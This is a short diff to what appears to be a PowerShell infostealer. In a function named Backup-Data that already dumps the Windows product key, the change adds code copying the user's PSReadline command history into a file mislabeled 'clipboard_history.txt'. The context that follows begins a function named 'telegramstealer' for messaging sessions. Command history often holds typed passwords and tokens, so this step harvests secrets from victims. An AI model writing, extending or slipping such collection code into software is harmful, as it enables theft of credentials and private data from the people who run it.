@@ -379,6 +379,12 @@ function Backup-Data {
     }
     Get-ProductKey > $folder_general\productkey.txt
 
+    try {
+        Get-Content (Get-PSReadlineOption).HistorySavePath | Out-File -FilePath "$folder_general\clipboard_history.txt" -Encoding UTF8
+    } catch {
+        # PSReadline is probably not enabled.
+    }
+
 
     # All Messaging Sessions
     function telegramstealer {
